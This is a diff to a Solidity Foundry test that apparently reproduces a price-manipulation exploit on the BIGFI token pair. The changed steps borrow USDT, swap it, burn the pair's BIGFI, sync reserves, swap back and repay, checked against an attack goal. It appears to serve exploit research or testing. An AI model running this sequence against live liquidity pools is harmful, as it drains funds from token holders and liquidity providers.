@@ -149,7 +149,7 @@ contract BIGFITest is Test, BlockLoader {
     }
 
     function burn_pair_bigfi(uint256 amount) internal {
-        bigfi.burn(amount);
+        bigfi.burn(address(pair), amount);
     }
 
     function test_gt() public {
@@ -157,12 +157,14 @@ contract BIGFITest is Test, BlockLoader {
         printBalance("After step0 ");
         swap_pair_usdt_bigfi(usdt.balanceOf(attacker));
         printBalance("After step1 ");
-        burn_pair_bigfi(20999908387035301038233287);
+        burn_pair_bigfi(3260e18);
         printBalance("After step2 ");
-        swap_pair_bigfi_usdt(bigfi.balanceOf(attacker));
+        sync_pair();
         printBalance("After step3 ");
-        payback_usdt(200600e18);
+        swap_pair_bigfi_usdt(bigfi.balanceOf(attacker));
         printBalance("After step4 ");
+        payback_usdt(200600e18);
+        printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
     }
 
@@ -177,6 +179,7 @@ contract BIGFITest is Test, BlockLoader {
         borrow_usdt(amt0);
         swap_pair_usdt_bigfi(amt1);
         burn_pair_bigfi(amt2);
+        sync_pair();
         swap_pair_bigfi_usdt(amt3);
         payback_usdt(amt4);
         assert(!attackGoal());
